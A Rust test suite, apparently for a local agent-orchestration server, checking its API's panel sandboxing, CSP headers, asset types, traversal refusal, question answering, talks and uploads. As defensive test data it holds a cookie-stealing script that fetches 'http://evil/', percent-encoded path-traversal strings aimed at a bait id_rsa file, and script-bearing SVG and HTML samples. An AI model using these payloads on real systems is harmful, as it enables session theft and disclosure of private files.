    fn launch_knocking_on_the_way_out(
        _opts: daemon::Opts,
        stop: daemon::Stop,
    ) -> Pin<Box<dyn Future<Output = Result<()>> + Send>> {
        Box::pin(async move {
            while !stop.stopped() {
                tokio::time::sleep(Duration::from_millis(2)).await;
            }
            let addr = PARK_KNOCK
                .lock()
                .expect("park knock")
                .expect("the test set an address");
            let heard = request(addr, "GET", "/api/health", None).await.status;
            *PARK_HEARD.lock().expect("park heard") = Some(heard);
            Ok(())
        })
    }

    /// The loop view once `want` accepts it.
    ///
    /// Polled rather than asserted straight after the POST because stopping
    /// is deliberately not instant - that is the contract - and rather than
    /// slept through because a fixed wait is either flaky or slow. Two
    /// seconds is far longer than a stand-in loop needs and still finite, so
    /// a genuine hang fails the test instead of hanging the suite.
    async fn settled(fx: &Fixture, want: fn(&Value) -> bool) -> Value {
        for _ in 0..200 {
            let view = fx.get("/api/loop").await.json();
            if want(&view) {
                return view;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        panic!(
            "the loop never settled: {}",
            fx.get("/api/loop").await.json()
        );
    }

    /// File an open question directly in the store the server reads.
    fn ask(fx: &Fixture, summary: &str, choices: &[&str]) -> String {
        let store = fx.questions();
        let mut q = Question::new(
            "20260902-000000-beef".to_owned(),
            "implement".to_owned(),
            "impl-A".to_owned(),
            summary.to_owned(),
            "because it matters".to_owned(),
            choices.iter().map(|c| (*c).to_owned()).collect(),
        );
        store.put(&mut q).expect("put question");
        q.id
    }

    /// A question with a panel the server can serve, plus the named assets.
    ///
    /// Written through `Questions::put_panel` rather than by laying out the
    /// directory here, so these tests exercise the same on-disk shape the
    /// agents produce and cannot pass against a layout only the tests know.
    fn panel(fx: &Fixture, html: &str, assets: &[(&str, &[u8])]) -> String {
        let store = fx.questions();
        let mut q = Question::new(
            "20260902-000000-beef".to_owned(),
            "land".to_owned(),
            "fix".to_owned(),
            "Merge this?".to_owned(),
            "the diff is in the panel".to_owned(),
            vec!["merge".to_owned(), "hold".to_owned()],
        );
        // Staged outside the questions root, because `put_panel` copies from
        // wherever the agent left its files.
        let staging = fx.home.path().join("staging");
        std::fs::create_dir_all(&staging).expect("staging dir");
        let sources: Vec<PathBuf> = assets
            .iter()
            .map(|(name, bytes)| {
                let path = staging.join(name);
                std::fs::write(&path, bytes).expect("write staged asset");
                path
            })
            .collect();
        store
            .put_panel(&mut q, html, &sources)
            .expect("write the panel");
        store.put(&mut q).expect("put question");
        q.id
    }

    /// A talk on disk, without talking to a model.
    ///
    /// Written as JSON straight into the store the server reads, because the
    /// only constructor `talk::begin` offers takes no turn but still requires
    /// a real caller-visible flow. The one thing this cannot make up is the
    /// seat, so it is built with the real `SeatState::new` and serialized -
    /// the alternative, hand-writing that object, would make these tests fail
    /// the day the seat gains a field.
    fn seed_talk(fx: &Fixture, id: &str, status: &str) -> String {
        let store = fx.talks();
        std::fs::create_dir_all(store.root()).expect("talks dir");
        let seat = serde_json::to_value(crate::agent::SeatState::new("talk", "mock", 7))
            .expect("serialize a seat");
        let body = serde_json::json!({
            "schema": 1,
            "id": id,
            "repo": "/repo/magi",
            "agent": "mock",
            "status": status,
            "turns": [],
            "created_at": Timestamp::now().to_string(),
            "updated_at": Timestamp::now().to_string(),
            "seat": seat,
        });
        std::fs::write(store.path_of(id), body.to_string()).expect("write the talk");
        store.get(id).expect("the seeded talk has to be readable");
        id.to_owned()
    }

    #[tokio::test]
    async fn both_panel_routes_send_the_whole_policy_that_makes_agent_html_safe() {
        let fx = Fixture::start().await;
        let id = panel(
            &fx,
            "<h1>Merge?</h1><img src=\"diff.svg\">",
            &[("diff.svg", b"<svg xmlns='http://www.w3.org/2000/svg'/>")],
        );

        for path in [
            format!("/api/questions/{id}/panel"),
            format!("/api/questions/{id}/asset/diff.svg"),
        ] {
            let res = fx.get(&path).await;
            assert_eq!(res.status, 200, "{path}: {}", res.body);
            // The whole string, not a substring. A weakened directive - an
            // `img-src *` that lets a panel beacon out to a remote host, a
            // `script-src` anything, a missing `form-action` that lets it post
            // the owner's decision to a third party - has to fail here, and a
            // `contains` assertion would let every one of those through.
            assert_eq!(
                res.header("content-security-policy"),
                Some(
                    "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; \
                     font-src data:; base-uri 'none'; form-action 'none'; \
                     frame-ancestors 'self'"
                ),
                "{path} is the only thing between a hostile panel and the tailnet"
            );
            assert_eq!(
                res.header("x-content-type-options"),
                Some("nosniff"),
                "{path}: a browser must not re-decide the type we sent"
            );
            assert_eq!(
                res.header("referrer-policy"),
                Some("no-referrer"),
                "{path}: a panel must not leak the question id off the machine"
            );

            // The front end mounts the frame only after a `HEAD` says the
            // panel is there, so `HEAD` has to answer with the same status and
            // the same policy as `GET` - a preflight that came back without
            // the CSP would mean a frame mounted on an unverified promise.
            let pre = fx.head(&path).await;
            assert_eq!(pre.status, res.status, "{path}: HEAD must agree with GET");
            assert_eq!(
                pre.header("content-security-policy"),
                res.header("content-security-policy"),
                "{path}: the preflight carries the same policy"
            );
            assert_eq!(
                pre.header("content-type"),
                res.header("content-type"),
                "{path}: the preflight carries the same type"
            );
        }
    }

    #[tokio::test]
    async fn a_panel_reaches_the_browser_byte_for_byte() {
        let fx = Fixture::start().await;
        // Markup a sanitiser would be tempted to touch: a stray `<`, a script
        // tag, an entity, and a multi-byte character. The sandbox is what makes
        // this safe, so nothing here may be rewritten on the way out - a
        // rewritten diff is a diff the owner cannot trust.
        let html = "<h1>Merge?</h1><p>a &lt; b — 変更</p><script>alert(1)</script>";
        let id = panel(&fx, html, &[]);

        let res = fx.get(&format!("/api/questions/{id}/panel")).await;

        assert_eq!(res.status, 200);
        assert_eq!(res.bytes, html.as_bytes(), "served verbatim, not sanitised");
        assert_eq!(res.header("content-type"), Some("text/html; charset=utf-8"));
        assert_eq!(
            res.header("content-disposition"),
            None,
            "the panel itself is rendered in the frame, not downloaded"
        );
    }

    #[tokio::test]
    async fn an_svg_asset_is_a_download_and_a_png_is_not() {
        let fx = Fixture::start().await;
        let svg = b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>";
        let png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR".as_slice();
        let id = panel(
            &fx,
            "<img src=\"diff.svg\"><img src=\"shot.png\">",
            &[("diff.svg", svg), ("shot.png", png)],
        );

        let as_svg = fx.get(&format!("/api/questions/{id}/asset/diff.svg")).await;
        let as_png = fx.get(&format!("/api/questions/{id}/asset/shot.png")).await;

        assert_eq!(as_svg.status, 200);
        assert_eq!(as_svg.header("content-type"), Some("image/svg+xml"));
        // An SVG is XML that may carry script. Inside the panel it is an
        // `<img src>` and the script cannot run; opened at the top level it
        // would be a document on magi's own origin, so the browser is told to
        // download it instead of rendering it.
        assert_eq!(as_svg.header("content-disposition"), Some("attachment"));

        assert_eq!(as_png.status, 200);
        assert_eq!(as_png.header("content-type"), Some("image/png"));
        assert_eq!(
            as_png.header("content-disposition"),
            None,
            "a raster image has no execution surface, so tapping it still shows it"
        );
        assert_eq!(as_png.bytes, png, "a binary asset survives the round trip");
    }

    #[tokio::test]
    async fn an_html_asset_is_never_served_as_html() {
        let fx = Fixture::start().await;
        let id = panel(
            &fx,
            "<p>see the notes</p>",
            &[
                (
                    "notes.html",
                    b"<script>fetch('http://evil/'+document.cookie)</script>",
                ),
                ("hook.js", b"fetch('http://evil/')"),
                ("data.json", b"{}"),
                ("HEADLINE.TXT", b"plain"),
            ],
        );

        for name in ["notes.html", "hook.js", "data.json"] {
            let res = fx.get(&format!("/api/questions/{id}/asset/{name}")).await;
            assert_eq!(res.status, 200, "{name}: {}", res.body);
            // Serving this as text/html would be a way to reach agent markup
            // at the top level of the operator's browser, outside the frame's
            // sandbox and outside its CSP - which is the whole thing the panel
            // design exists to prevent. Unlisted types are downloads.
            assert_eq!(
                res.header("content-type"),
                Some("application/octet-stream"),
                "{name} must not be a type the browser will execute or render"
            );
        }
        // The whitelist is matched case-insensitively, so an agent shouting the
        // extension still gets a readable file rather than a download.
        let txt = fx
            .get(&format!("/api/questions/{id}/asset/HEADLINE.TXT"))
            .await;
        assert_eq!(
            txt.header("content-type"),
            Some("text/plain; charset=utf-8")
        );
    }

    #[tokio::test]
    async fn no_spelling_of_a_traversing_asset_name_reaches_the_filesystem() {
        let fx = Fixture::start().await;
        let id = panel(&fx, "<p>x</p>", &[("diff.svg", b"<svg/>")]);
        // Something outside the panel directory that a traversal would reach if
        // one got through, so a passing test is not merely "the file was
        // missing anyway".
        std::fs::write(fx.questions().root().join("id_rsa"), b"secret").expect("write the bait");

        // Decoded before this server's handler sees them: axum percent-decodes
        // path parameters, so `name` arrives as `../id_rsa`, `..\id_rsa` and a
        // string with a NUL in it. All three look like ordinary single-segment
        // filenames to the router, so the router passes them through and
        // `valid_asset_name` is what refuses them - for the literal `..`, and
        // for `/`, `\` and NUL not being in the permitted character set.
        for encoded in [
            "%2e%2e%2fid_rsa",
            "..%2fid_rsa",
            "..%5cid_rsa",
            "%2e%2e%5cid_rsa",
            "diff%00.svg",
            "..",
            ".hidden",
            "%2e%2e%2f%2e%2e%2fid_rsa",
        ] {
            let res = fx
                .get(&format!("/api/questions/{id}/asset/{encoded}"))
                .await;
            assert_eq!(
                res.status, 400,
                "`{encoded}` has to be refused by name, not looked up: {}",
                res.body
            );
            assert!(res.json()["error"].is_string(), "{}", res.body);
        }

        // Not decoded, and never this handler's problem: a real slash makes the
        // request one segment too long for `/api/questions/{id}/asset/{name}`,
        // so axum's router has no route to match and answers before any code
        // here runs. Asserted so that a future route with a wildcard segment
        // cannot quietly open this door.
        for literal in ["../id_rsa", "../../questions/id_rsa", "..%5c../id_rsa"] {
            let res = fx
                .get(&format!("/api/questions/{id}/asset/{literal}"))
                .await;
            assert_eq!(
                res.status, 404,
                "`{literal}` must not match the asset route at all: {}",
                res.body
            );
        }
    }

    #[tokio::test]
    async fn a_missing_panel_and_an_unknown_asset_are_both_json_404s() {
        let fx = Fixture::start().await;
        let plain = ask(&fx, "Which backend?", &["SQLite"]);
        let with_panel = panel(&fx, "<p>x</p>", &[("diff.svg", b"<svg/>")]);

        // A question nobody wrote a panel for. The client preflights with HEAD
        // and cannot see inside a sandboxed frame, so this must be a status and
        // not an empty page.
        let none = fx.get(&format!("/api/questions/{plain}/panel")).await;
        assert_eq!(none.status, 404, "{}", none.body);
        assert!(none.json()["error"].is_string(), "{}", none.body);
        assert_eq!(
            fx.head(&format!("/api/questions/{plain}/panel"))
                .await
                .status,
            404,
            "the preflight is the only way the client can learn this"
        );

        // A name that is perfectly legal and simply is not there.
        let missing = fx
            .get(&format!("/api/questions/{with_panel}/asset/absent.png"))
            .await;
        assert_eq!(missing.status, 404, "{}", missing.body);
        assert!(missing.json()["error"].is_string(), "{}", missing.body);

        // A question that does not exist at all, on both routes.
        assert_eq!(fx.get("/api/questions/nope/panel").await.status, 404);
        assert_eq!(
            fx.get("/api/questions/nope/asset/diff.svg").await.status,
            404
        );
    }

    #[tokio::test]
    async fn a_run_with_an_open_question_reads_as_waiting() {
        let fx = Fixture::start().await;
        let run = "20260902-000000-beef".to_owned();
        write_run(&fx.runs(), &run, RunStatus::Implementing);

        let before = fx.get("/api/runs").await.json();
        assert_eq!(before[0]["waiting"], false, "{before}");

        let store = fx.questions();
        let mut q = Question::new(
            run.clone(),
            "implement".to_owned(),
            "impl-A".to_owned(),
            "Which backend?".to_owned(),
            String::new(),
            vec!["SQLite".to_owned()],
        );
        store.put(&mut q).expect("put");

        let during = fx.get("/api/runs").await.json();
        assert_eq!(during[0]["waiting"], true, "{during}");

        // Answered: the run is moving again, and the flag has to follow without
        // anything having rewritten run.json.
        q.answer(Answer::Choice("SQLite".to_owned()))
            .expect("answer");
        store.put(&mut q).expect("put");
        let after = fx.get("/api/runs").await.json();
        assert_eq!(after[0]["waiting"], false, "{after}");
    }

    #[tokio::test]
    async fn an_open_question_is_listed_and_counted_by_health() {
        let fx = Fixture::start().await;
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 0);

        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let listed = fx.get("/api/questions").await.json();
        assert_eq!(listed.as_array().expect("array").len(), 1);
        assert_eq!(listed[0]["id"], id);
        assert_eq!(listed[0]["status"], "open");
        assert_eq!(listed[0]["choices"][1], "Redis");
        // The count is what makes the phone's indicator honest: it is the one
        // number meaning nothing will move until a human acts.
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
    }

    #[tokio::test]
    async fn answering_records_the_choice_and_a_second_answer_conflicts() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let path = format!("/api/questions/{id}/answer");

        let res = fx.post(&path, Some(r#"{"choice":"Redis"}"#)).await;
        assert_eq!(res.status, 200, "{}", res.body);
        let body = res.json();
        assert_eq!(body["status"], "answered");
        assert_eq!(body["answer"]["choice"], "Redis");

        // Answered from the terminal in between the list and the tap: the UI
        // must be able to tell this from a bad request, so it can show the
        // recorded answer instead of an error.
        let again = fx.post(&path, Some(r#"{"choice":"SQLite"}"#)).await;
        assert_eq!(again.status, 409, "{}", again.body);
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 0);
    }

    #[tokio::test]
    async fn saying_something_appends_a_turn_without_answering() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let path = format!("/api/questions/{id}/say");

        let res = fx
            .post(&path, Some(r#"{"body":"why not Postgres?"}"#))
            .await;
        assert_eq!(res.status, 200, "{}", res.body);
        let body = res.json();
        assert_eq!(body["status"], "open", "talking back is not a decision");
        assert_eq!(body["answer"], Value::Null);
        assert_eq!(body["thread"][0]["who"], "operator");
        assert_eq!(body["thread"][0]["body"], "why not Postgres?");
        assert_eq!(body["waiting_on_agent"], true);
        // Still open, still counted, still exactly one question.
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
    }

    #[tokio::test]
    async fn asking_back_clears_the_owner_count_until_the_agent_replies() {
        let fx = Fixture::start().await;
        let store = fx.questions();
        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        assert_eq!(
            fx.get("/api/health").await.json()["questions_needs_owner"],
            1
        );

        // The owner asks back instead of deciding: the ask bar, the nav badge
        // and the title must stop naming this question, because there is
        // nothing to decide until the agent answers - `status` alone cannot
        // say that, which is the whole reason `questions_needs_owner` exists
        // alongside `questions_open`.
        let res = fx
            .post(
                &format!("/api/questions/{id}/say"),
                Some(r#"{"body":"why not Postgres?"}"#),
            )
            .await;
        assert_eq!(res.status, 200, "{}", res.body);
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
        assert_eq!(
            fx.get("/api/health").await.json()["questions_needs_owner"],
            0,
            "waiting on the agent is not waiting on the owner"
        );

        // `magi ask --thread` replying is what brings the owner count back -
        // the same event that would resume the CLI call blocked in `magi
        // ask`.
        let mut q = store.get(&id).expect("get");
        q.reply("because SQLite needs no server", vec!["SQLite".to_owned()])
            .expect("reply");
        store.put(&mut q).expect("put");
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
        assert_eq!(
            fx.get("/api/health").await.json()["questions_needs_owner"],
            1,
            "the agent's reply is what should light the banner back up"
        );
    }

    #[tokio::test]
    async fn saying_something_is_refused_when_empty_answered_or_abandoned() {
        let fx = Fixture::start().await;
        let store = fx.questions();

        let empty_id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let res = fx
            .post(
                &format!("/api/questions/{empty_id}/say"),
                Some(r#"{"body":"   "}"#),
            )
            .await;
        assert_eq!(res.status, 400, "{}", res.body);

        let answered_id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let mut answered = store.get(&answered_id).expect("get");
        answered
            .answer(Answer::Choice("SQLite".to_owned()))
            .expect("answer");
        store.put(&mut answered).expect("put");
        let res = fx
            .post(
                &format!("/api/questions/{answered_id}/say"),
                Some(r#"{"body":"still there?"}"#),
            )
            .await;
        assert_eq!(res.status, 409, "{}", res.body);

        let abandoned_id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let mut abandoned = store.get(&abandoned_id).expect("get");
        abandoned.abandon("timed out");
        store.put(&mut abandoned).expect("put");
        let res = fx
            .post(
                &format!("/api/questions/{abandoned_id}/say"),
                Some(r#"{"body":"still there?"}"#),
            )
            .await;
        assert_eq!(res.status, 409, "{}", res.body);
    }

    #[tokio::test]
    async fn an_answer_the_question_does_not_offer_is_refused() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let path = format!("/api/questions/{id}/answer");

        for body in [
            r#"{"choice":"Postgres"}"#,
            r#"{"text":"whatever you think"}"#,
            r#"{"choice":"Redis","text":"both"}"#,
            r#"{}"#,
        ] {
            let res = fx.post(&path, Some(body)).await;
            assert_eq!(res.status, 400, "{body} should be refused: {}", res.body);
            assert!(res.json()["error"].is_string(), "{}", res.body);
        }
        // Nothing above may have answered it.
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
    }

    #[tokio::test]
    async fn a_free_text_question_takes_text_and_not_a_choice() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "What should the flag be called?", &[]);
        let path = format!("/api/questions/{id}/answer");

        assert_eq!(
            fx.post(&path, Some(r#"{"choice":"--json"}"#)).await.status,
            400
        );
        let res = fx.post(&path, Some(r#"{"text":"--json"}"#)).await;
        assert_eq!(res.status, 200, "{}", res.body);
        assert_eq!(res.json()["answer"]["text"], "--json");
    }

    #[tokio::test]
    async fn an_unknown_question_is_a_json_404() {
        let fx = Fixture::start().await;
        let res = fx
            .post("/api/questions/nope/answer", Some(r#"{"text":"x"}"#))
            .await;
        assert_eq!(res.status, 404, "{}", res.body);
        assert!(res.json()["error"].is_string());
    }

    /// New work reaches the queue through `magi task add`, a standing talk's
    /// `magi task add --solo`, or the CLI - never a raw `POST /api/queue` -
    /// so the compose form and that route are gone. The tests that covered
    /// that route's validation went with it, and nothing was left asserting
    /// it stays gone — so a re-added handler would silently let the phone
    /// file briefs no one validated.
    #[tokio::test]
    async fn a_task_cannot_be_filed_over_the_phone_directly() {
        let f = Fixture::start().await;

        let res = f
            .post(
                "/api/queue",
                Some(r#"{"instruction":"Add a --json flag to magi list"}"#),
            )
            .await;

        assert_eq!(
            res.status, 405,
            "POST /api/queue must not be a route: {}",
            res.body
        );
        assert!(
            f.queue().list().is_empty(),
            "a task filed by a route that does not exist must not reach the disk"
        );
        // The path itself is still served — the Queue view reads it — and the
        // per-task controls are untouched by the entry being removed.
        assert_eq!(f.get("/api/queue").await.status, 200);
    }

    /// `<repo>/host/owner/repo/.git`, the ghq layout [`repos::scan`] expects.
    fn make_checkout(root: &FsPath, host: &str, owner: &str, repo: &str) {
        std::fs::create_dir_all(root.join(host).join(owner).join(repo).join(".git"))
            .expect("checkout dir");
    }

    #[tokio::test]
    async fn repos_list_returns_name_and_path_for_every_configured_root() {
        let tmp = TempDir::new().expect("tempdir");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).expect("repo dir");
        let root = tmp.path().join("root");
        make_checkout(&root, "github.com", "yukimemi", "magi");
        std::fs::write(
            repo.join("magi.toml"),
            format!(
                "[repos]\nroots = [{:?}]\n",
                root.to_string_lossy().into_owned()
            ),
        )
        .expect("write magi.toml");

        let f = Fixture::with_repo(repo).await;
        let res = f.get("/api/repos").await;
        assert_eq!(res.status, 200, "{}", res.body);
        let list = res.json();
        let repos = list.as_array().expect("an array");
        assert_eq!(repos.len(), 1);
        assert_eq!(repos[0]["name"], "yukimemi/magi");
        assert!(
            repos[0]["path"]
                .as_str()
                .is_some_and(|p| p.ends_with("magi") || p.contains("magi")),
            "{list}"
        );
    }

    #[tokio::test]
    async fn repos_list_only_rescans_within_the_ttl_when_asked_to() {
        let tmp = TempDir::new().expect("tempdir");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).expect("repo dir");
        let root = tmp.path().join("root");
        make_checkout(&root, "github.com", "yukimemi", "magi");
        std::fs::write(
            repo.join("magi.toml"),
            format!(
                "[repos]\nroots = [{:?}]\nscan_ttl = 3600\n",
                root.to_string_lossy().into_owned()
            ),
        )
        .expect("write magi.toml");

        let f = Fixture::with_repo(repo).await;
        let first = f.get("/api/repos").await;
        assert_eq!(first.json().as_array().map(Vec::len), Some(1));

        // A second checkout appears; within the TTL the cached answer must
        // not notice it.
        make_checkout(&root, "github.com", "yukimemi", "rvpm");
        let second = f.get("/api/repos").await;
        assert_eq!(
            second.json().as_array().map(Vec::len),
            Some(1),
            "a fresh cache must not rescan inside the TTL"
        );

        let refreshed = f.get("/api/repos?refresh=1").await;
        assert_eq!(
            refreshed.json().as_array().map(Vec::len),
            Some(2),
            "an explicit refresh must rescan even inside the TTL"
        );
    }

    /// A `kind = "command"` agent that ignores its prompt and answers a fixed
    /// string, declared straight in a repository's own `magi.toml` rather
    /// than the operator's real roster. No real agent CLI is spawned - `sh`
    /// is the interpreter, the same as `talk::tests::mock_agent` uses - so
    /// this is safe to run over a real HTTP round trip.
    const MOCK_AGENT_TOML: &str = "[[agents]]\nid = \"mock\"\nkind = \"command\"\ncommand = [\"sh\", \"-c\", \"cat >/dev/null && printf ok\"]\n";

    /// A repo carrying `MOCK_AGENT_TOML`, for the talk routes that need a
    /// real `Config::discover` to find an agent - `talk::begin` resolves one
    /// even though it takes no turn, and `talk_say` invokes one.
    async fn talk_fixture() -> (TempDir, PathBuf, Fixture) {
        let tmp = TempDir::new().expect("tempdir");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).expect("repo dir");
        std::fs::write(repo.join("magi.toml"), MOCK_AGENT_TOML).expect("write magi.toml");
        let f = Fixture::with_repo(repo.clone()).await;
        (tmp, repo, f)
    }

    #[tokio::test]
    async fn posting_a_talk_with_no_body_opens_one_and_takes_no_turn() {
        let (_tmp, _repo, f) = talk_fixture().await;

        // No body at all - `f.post(.., None)` sends no `Content-Type` either -
        // is the ordinary way a phone opens a talk.
        let opened = f.post("/api/talks", None).await;
        assert_eq!(opened.status, 201, "{}", opened.body);
        let body = opened.json();
        assert_eq!(body["status"], "open");
        assert_eq!(
            body["turns"].as_array().unwrap().len(),
            0,
            "opening takes no agent turn: there is nothing yet to answer"
        );

        // An explicit empty object is the same request as none at all.
        let also_opened = f.post("/api/talks", Some("{}")).await;
        assert_eq!(also_opened.status, 201, "{}", also_opened.body);

        let listed = f.get("/api/talks").await.json();
        assert_eq!(listed.as_array().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn talk_detail_lists_the_tasks_it_has_filed_and_stays_open() {
        let f = Fixture::start().await;
        let talk_id = seed_talk(&f, "20260904-014455-ab12", "open");
        let queue = f.queue();
        let mut mine = Task::new(
            "rename the loader".to_owned(),
            "rename the loader".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Agent {
                run: talk_id.clone(),
                node: "chat".to_owned(),
            },
        );
        queue.put(&mut mine).expect("file the task");
        let mut theirs = Task::new(
            "unrelated".to_owned(),
            "unrelated".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        queue.put(&mut theirs).expect("file the task");

        let res = f.get(&format!("/api/talks/{talk_id}")).await;
        assert_eq!(res.status, 200, "{}", res.body);
        let body = res.json();
        assert_eq!(
            body["status"], "open",
            "filing a task does not close a talk"
        );
        let tasks = body["tasks"].as_array().expect("tasks array");
        assert_eq!(tasks.len(), 1, "only this talk's own task is listed");
        assert_eq!(tasks[0]["id"], mine.id);
    }

    #[tokio::test]
    async fn talk_say_records_the_operators_turn_before_the_agents_reply_lands() {
        let (_tmp, _repo, f) = talk_fixture().await;
        let id = f.post("/api/talks", None).await.json()["id"]
            .as_str()
            .expect("id")
            .to_owned();

        let res = f
            .post(
                &format!("/api/talks/{id}/say"),
                Some(r#"{"text":"what does the queue module do?"}"#),
            )
            .await;
        assert_eq!(res.status, 202, "{}", res.body);
        let queued = res.json();
        let turns = queued["turns"].as_array().expect("turns array");
        assert_eq!(
            turns.len(),
            1,
            "the answer reflects only what is on disk the instant it is sent, \
             before the agent's turn - which can run for the whole of \
             `[graph] timeout_talk` - has a chance to land: {queued}"
        );
        assert_eq!(turns[0]["who"], "operator");
        assert_eq!(turns[0]["body"], "what does the queue module do?");
        assert_eq!(
            queued["thinking"], true,
            "the accepted response exposes the background turn claim: {queued}"
        );

        let mut turns_after = 1;
        for _ in 0..200 {
            let detail = f.get(&format!("/api/talks/{id}")).await.json();
            turns_after = detail["turns"].as_array().expect("turns array").len();
            if turns_after == 2 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        assert_eq!(turns_after, 2, "the agent's reply eventually lands");
    }

    /// Keeps both claims observable long enough to exercise the distinction
    /// between one busy talk and a globally locked Chat surface.
    const SLOW_MOCK_AGENT_TOML: &str = "[[agents]]\nid = \"mock\"\nkind = \"command\"\ncommand = [\"sh\", \"-c\", \"cat >/dev/null && sleep 0.3 && printf ok\"]\n";

    #[tokio::test]
    async fn talks_report_independent_thinking_claims_and_refuse_only_their_own_second_turn() {
        let tmp = TempDir::new().expect("tempdir");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).expect("repo dir");
        std::fs::write(repo.join("magi.toml"), SLOW_MOCK_AGENT_TOML).expect("write config");
        let f = Fixture::with_repo(repo).await;
        let id_a = f.post("/api/talks", None).await.json()["id"]
            .as_str()
            .unwrap()
            .to_owned();
        let id_b = f.post("/api/talks", None).await.json()["id"]
            .as_str()
            .unwrap()
            .to_owned();

        let a = f
            .post(&format!("/api/talks/{id_a}/say"), Some(r#"{"text":"a"}"#))
            .await;
        assert_eq!(a.status, 202, "{}", a.body);
        assert_eq!(a.json()["thinking"], true);
        let b = f
            .post(&format!("/api/talks/{id_b}/say"), Some(r#"{"text":"b"}"#))
            .await;
        assert_eq!(b.status, 202, "{}", b.body);
        assert_eq!(b.json()["thinking"], true);

        let listed = f.get("/api/talks").await.json();
        for id in [&id_a, &id_b] {
            let view = listed
                .as_array()
                .unwrap()
                .iter()
                .find(|talk| talk["id"] == *id)
                .unwrap();
            assert_eq!(view["thinking"], true, "{listed}");
        }
        let repeated = f
            .post(
                &format!("/api/talks/{id_a}/say"),
                Some(r#"{"text":"again"}"#),
            )
            .await;
        assert_eq!(repeated.status, 409, "{}", repeated.body);
    }

    /// Bytes `sniffed_mime` recognises as `image/png` - the signature plus a
    /// few more, since real uploads are never exactly eight bytes.
    const PNG_BYTES: &[u8] = b"\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01";

    #[tokio::test]
    async fn a_png_attachment_upload_is_201_and_get_returns_it_with_nosniff() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260905-000000-a1b2", "open");

        let res = f
            .post_bytes(
                &format!("/api/talks/{id}/attachments"),
                &[("Content-Type", "image/png"), ("X-Filename", "shot.png")],
                PNG_BYTES,
            )
            .await;
        assert_eq!(res.status, 201, "{}", res.body);
        let body = res.json();
        assert_eq!(body["name"], "shot.png");
        assert_eq!(body["mime"], "image/png");
        assert_eq!(body["bytes"], PNG_BYTES.len());
        let att_id = body["id"].as_str().expect("id").to_owned();
        assert_eq!(
            att_id.len(),
            32,
            "the id must never be a client-suppliable path: {att_id}"
        );

        let got = f
            .get(&format!("/api/talks/{id}/attachments/{att_id}"))
            .await;
        assert_eq!(got.status, 200, "{}", got.body);
        assert_eq!(got.header("content-type"), Some("image/png"));
        assert_eq!(got.header("x-content-type-options"), Some("nosniff"));
        assert_eq!(got.bytes, PNG_BYTES);
    }

    #[tokio::test]
    async fn an_svg_a_text_file_and_an_oversized_upload_are_all_4xx() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260905-000000-c3d4", "open");

        // SVG can carry a `<script>`, so it is never on the whitelist even
        // though it is a real IANA image type.
        let svg = f
            .post_bytes(
                &format!("/api/talks/{id}/attachments"),
                &[("Content-Type", "image/svg+xml")],
                b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>",
            )
            .await;
        assert!(
            (400..500).contains(&svg.status),
            "svg must be refused: {} {}",
            svg.status,
            svg.body
        );
        assert!(svg.body.contains("SVG"), "{}", svg.body);

        let text = f
            .post_bytes(
                &format!("/api/talks/{id}/attachments"),
                &[("Content-Type", "text/plain")],
                b"just some text",
            )
            .await;
        assert!(
            (400..500).contains(&text.status),
            "an unlisted type must be refused: {} {}",
            text.status,
            text.body
        );

        // The declared type is a real png, but the size check runs before
        // the bytes are even looked at.
        let oversized = vec![0u8; ATTACHMENT_MAX_BYTES + 1];
        let big = f
            .post_bytes(
                &format!("/api/talks/{id}/attachments"),
                &[("Content-Type", "image/png")],
                &oversized,
            )
            .await;
        assert_eq!(
            big.status,
            StatusCode::PAYLOAD_TOO_LARGE.as_u16(),
            "{}",
            big.body
        );
    }

    #[tokio::test]
    async fn a_mislabeled_upload_is_refused_even_though_the_declared_type_is_on_the_whitelist() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260905-000000-d4e5", "open");

        // A whitelisted `Content-Type`, but bytes that are not actually a
        // png - the declared header alone is never trusted.
        let res = f
            .post_bytes(
                &format!("/api/talks/{id}/attachments"),
                &[("Content-Type", "image/png")],
                b"<html>not a picture</html>",
            )
            .await;
        assert!((400..500).contains(&res.status), "{}", res.body);
    }

    #[tokio::test]
    async fn an_unknown_attachment_id_is_a_404() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260905-000000-e5f6", "open");

        let res = f
            .get(&format!("/api/talks/{id}/attachments/{}", "0".repeat(32)))
            .await;
        assert_eq!(res.status, 404, "{}", res.body);
    }

    #[tokio::test]
    async fn talk_say_with_only_an_attachment_and_no_body_is_accepted_and_persists() {
        let f = Fixture::start().await;
